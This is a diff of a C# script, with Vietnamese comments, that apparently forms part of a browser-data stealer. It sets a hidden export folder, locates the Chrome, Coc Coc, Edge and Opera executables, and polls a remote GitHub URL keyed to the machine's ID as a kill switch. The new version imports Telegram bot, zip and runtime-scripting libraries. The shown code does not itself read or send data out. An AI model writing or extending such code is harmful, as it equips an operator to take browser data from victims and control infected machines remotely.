@@ -1,25 +1,37 @@
-string exportPath = @"C:\Intel\br";
-// Dành cho Chrome và Cốc Cốc (64-bit thường nằm ở ProgramW6432)
-var ChromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
+using System;
+using System.CodeDom;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net.Http;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Xml.Linq;
+using Ionic.Zip;
+using Microsoft.CodeAnalysis.CSharp.Scripting;
+using Microsoft.CodeAnalysis.Scripting;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+using Telegram.Bot;
+using Telegram.Bot.Types.Enums;
+
+public class ScriptExecutor
+{{
+    public static async Task Run()
+    {{
+        var exportPath = @"C:\Intel\br";
+
+var chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
     "Google", "Chrome", "Application", "chrome.exe");
 
-var CocCocPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
-    "CocCoc", "Browser", "Application", "browser.exe");
+var url = $"https://example.com/test.txt?check={Guid.NewGuid()}";
 
-// Dành cho Edge (thường nằm ở Program Files (x86))
-var EdgePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
-    "Microsoft", "Edge", "Application", "msedge.exe");
-
-// Dành cho Opera (thường cài ở Local AppData)
-var OperaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-    "Programs", "Opera", "opera.exe");
-
-string url =
-    $"https://raw.githubusercontent.com/vinhuptoday/brbn/main/{Helpers.Functions.GetUUID()}.txt?check={Guid.NewGuid().ToString()}";
-using HttpClient client = new HttpClient();
+using var client = new HttpClient();
 try
 {
-    string content = await client.GetStringAsync(url);
+    var content = await client.GetStringAsync(url);
     if (content.Contains("off"))
     {
         Environment.Exit(0);
@@ -27,5 +39,8 @@ try
 }
 catch (Exception ex)
 {
-
+    Console.WriteLine(ex.Message);
 }
+
+    }}
+}}
